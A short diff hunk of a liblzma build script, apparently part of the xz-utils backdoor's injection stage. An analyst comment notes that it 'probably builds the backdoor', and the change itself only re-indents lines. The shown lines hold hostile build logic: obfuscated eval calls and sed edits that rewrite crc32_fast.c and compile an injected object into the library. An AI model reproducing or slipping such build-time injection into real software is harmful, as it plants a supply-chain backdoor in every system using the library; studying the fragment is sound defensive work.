@@ -238,10 +238,10 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
         cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
         eval $BPep
         if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
-            sed "/include \"crc32_arm64.h\"/a \\$V" | \
-            sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
-            # This probably builds the backdoor after all the sed commands make edits to the source code
-            $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
+        sed "/include \"crc32_arm64.h\"/a \\$V" | \
+        sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
+        # This probably builds the backdoor after all the sed commands make edits to the source code
+        $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
             eval $RgYB
             if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
                 if test ! -f .libs/liblzma.so; then
